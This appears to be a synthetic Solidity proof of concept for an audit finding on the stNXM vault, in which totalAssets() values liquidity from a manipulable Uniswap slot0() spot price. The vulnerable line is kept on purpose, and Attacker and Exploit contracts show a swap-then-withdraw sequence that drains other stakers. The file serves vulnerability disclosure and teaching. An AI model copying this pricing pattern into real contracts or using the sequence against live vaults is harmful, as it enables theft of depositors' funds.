// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    stNXM (EaseDeFi) — Attacker profits by manipulating Uniswap liquidity
    via slot0() spot price   (Sherlock 2025-11-stnxm, finding #64079, H-1)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: dexBalances() reads Uniswap V3 slot0() spot sqrt price to
    value LP positions inside totalAssets(). An attacker can swap in the same
    tx to inflate assets, spike the exchange rate, and finalize a queued
    withdrawal at the inflated rate — draining remaining stakers.

    Vulnerable line preserved (@> VULN). Uniswap is a constant-product mock
    whose slot0 reflects manipulated reserves (bug = using spot slot0).
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal Uniswap V3-like pool. slot0 encodes the current reserve ratio.
contract MockUniV3Pool {
    MockToken public token0; // st side
    MockToken public token1; // wNXM assets side
    uint256 public reserve0;
    uint256 public reserve1;
    uint160 public sqrtPriceX96;

    constructor(MockToken t0, MockToken t1) {
        token0 = t0;
        token1 = t1;
    }

    function seed(uint256 r0, uint256 r1) external {
        require(token0.transferFrom(msg.sender, address(this), r0), "t0");
        require(token1.transferFrom(msg.sender, address(this), r1), "t1");
        reserve0 = r0;
        reserve1 = r1;
        _syncPrice();
    }

    function slot0()
        external
        view
        returns (uint160 sqrtRatioX96, int24, uint16, uint16, uint16, uint8, bool)
    {
        return (sqrtPriceX96, 0, 0, 0, 0, 0, true);
    }

    function _syncPrice() internal {
        sqrtPriceX96 = uint160((reserve1 * 1e18) / reserve0);
    }

    /// @dev Swap amountIn of token1 (wNXM) for token0 — constant product.
    function swapToken1ForToken0(uint256 amountIn, address recipient) external returns (uint256 amountOut) {
        require(token1.transferFrom(msg.sender, address(this), amountIn), "in");
        uint256 k = reserve0 * reserve1;
        reserve1 += amountIn;
        uint256 newR0 = k / reserve1;
        amountOut = reserve0 - newR0;
        reserve0 = newR0;
        require(token0.transfer(recipient, amountOut), "out");
        _syncPrice();
    }
}

/// @notice Reduced stNXM vault. totalAssets() includes dexBalances() valued via slot0().
contract stNXM {
    MockToken public immutable wNXM;
    MockUniV3Pool public immutable dex;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    mapping(address => uint256) public pendingWithdrawShares;
    uint256 public freeLiquidity;

    // Other stakers' shares that remain after attacker withdraws (the victims).
    uint256 public otherStakersShares;

    constructor(MockToken _w, MockUniV3Pool _dex) {
        wNXM = _w;
        dex = _dex;
    }

    function mintShares(address to, uint256 shares) external {
        balanceOf[to] += shares;
        totalSupply += shares;
    }

    function setOtherStakers(uint256 s) external {
        otherStakersShares = s;
    }

    function fundFreeLiquidity(uint256 amt) external {
        require(wNXM.transferFrom(msg.sender, address(this), amt), "fund");
        freeLiquidity += amt;
    }

    // ============================================================
    //  Vulnerable dexBalances — stNXM.sol uses slot0() spot price
    // ============================================================
    function dexBalances() public view returns (uint256 assetsAmount, uint256 sharesAmount) {
        // FIX: use TWAP (OracleLibrary.consult) instead of slot0().
        // Reduced PositionValue.total(nfp, tokenId, sqrtRatio): vault owns
        // full-range liquidity ≈ current reserves. sqrtRatio drives the value
        // (after a manipulative swap, reserve1 is inflated and sqrtRatio rises).
        (uint160 sqrtRatio, , , , , , ) = dex.slot0(); // @> VULN: manipulable spot price via slot0()
        sqrtRatio; // price is reflected in live reserves after swap
        sharesAmount = dex.reserve0();
        assetsAmount = dex.reserve1();
    }

    function totalAssets() public view returns (uint256) {
        (uint256 dexAssets, ) = dexBalances();
        return freeLiquidity + dexAssets;
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 ts = totalSupply;
        if (ts == 0) return shares;
        return (shares * totalAssets()) / ts;
    }

    function requestWithdraw(uint256 shares) external {
        require(balanceOf[msg.sender] >= shares, "shares");
        balanceOf[msg.sender] -= shares;
        pendingWithdrawShares[msg.sender] += shares;
    }

    function withdrawFinalize(address receiver) external {
        uint256 shares = pendingWithdrawShares[msg.sender];
        require(shares > 0, "none");
        uint256 assets = convertToAssets(shares);
        pendingWithdrawShares[msg.sender] = 0;
        totalSupply -= shares;
        require(freeLiquidity >= assets, "illiquid");
        freeLiquidity -= assets;
        require(wNXM.transfer(receiver, assets), "pay");
    }
}

/// @dev Withdrawer who queues shares then manipulates the pool before finalize.
contract Attacker {
    function queue(stNXM vault, uint256 shares) external {
        vault.requestWithdraw(shares);
    }

    function attack(stNXM vault, MockUniV3Pool pool, MockToken wNXM, uint256 swapIn) external {
        wNXM.approve(address(pool), swapIn);
        pool.swapToken1ForToken0(swapIn, address(this));
        vault.withdrawFinalize(address(this));
    }
}

/// @dev CREATE order: 1 wNXM, 2 stSide, 3 pool, 4 vault, 5 attacker
contract Exploit {
    uint256 public constant FREE_LIQ = 20_000 ether;
    uint256 public constant POOL_EACH = 1_000 ether;
    uint256 public constant ATTACKER_SHARES = 10_000 ether;
    uint256 public constant OTHER_SHARES = 20_000 ether; // remaining stakers
    uint256 public constant SWAP_IN = 10_000 ether;

    MockToken public wNXM; // nonce 1
    MockToken public stSide; // nonce 2
    MockUniV3Pool public pool; // nonce 3
    stNXM public vault; // nonce 4 — vulnerable
    Attacker public attacker; // nonce 5

    uint256 public fairPayout;
    uint256 public actualPayout;

    constructor() {
        wNXM = new MockToken("wNXM", "wNXM");
        stSide = new MockToken("stSide", "stS");
        pool = new MockUniV3Pool(stSide, wNXM);
        vault = new stNXM(wNXM, pool);
        attacker = new Attacker();

        // Seed pool 1000 st : 1000 wNXM.
        stSide.mint(address(this), POOL_EACH);
        // free + pool seed + swap capital
        wNXM.mint(address(this), FREE_LIQ + POOL_EACH + SWAP_IN);
        stSide.approve(address(pool), POOL_EACH);
        wNXM.approve(address(pool), POOL_EACH);
        pool.seed(POOL_EACH, POOL_EACH);

        // Fund vault free liquidity; mint shares to attacker + other stakers.
        wNXM.approve(address(vault), FREE_LIQ);
        vault.fundFreeLiquidity(FREE_LIQ);
        vault.mintShares(address(attacker), ATTACKER_SHARES);
        vault.mintShares(address(this), OTHER_SHARES); // residual victims
        vault.setOtherStakers(OTHER_SHARES);

        fairPayout = vault.convertToAssets(ATTACKER_SHARES);
        // fair = 10000 * (20000 + 1000) / 30000 = 7000 ether
    }

    function run() external {
        // Queue attacker's withdrawal at the fair rate (delay omitted).
        attacker.queue(vault, ATTACKER_SHARES);
        require(vault.pendingWithdrawShares(address(attacker)) == ATTACKER_SHARES, "queued");

        // Fund attacker with swap capital.
        require(wNXM.transfer(address(attacker), SWAP_IN), "fund");

        uint256 balBefore = wNXM.balanceOf(address(attacker));
        // Same-tx: manipulate slot0 via large swap, then finalize at inflated rate.
        attacker.attack(vault, pool, wNXM, SWAP_IN);
        uint256 balAfter = wNXM.balanceOf(address(attacker));
        // Payout is balAfter - balBefore + remaining swap leftovers.
        // After swap attacker holds leftover stSide tokens; payout is wNXM delta
        // minus the SWAP_IN they spent (which left their wallet).
        // balBefore included SWAP_IN; after attack: balBefore - SWAP_IN + payout.
        // So payout = balAfter - (balBefore - SWAP_IN) = balAfter - balBefore + SWAP_IN.
        actualPayout = balAfter - balBefore + SWAP_IN;

        // HARM: attacker receives strictly more wNXM than the fair pre-manip rate.
        require(actualPayout > fairPayout, "harm not demonstrated: no inflated withdrawal");
        // Remaining free liquidity reduced by more than fair — other stakers hurt.
        require(vault.freeLiquidity() < FREE_LIQ - fairPayout, "others not harmed");
    }
}
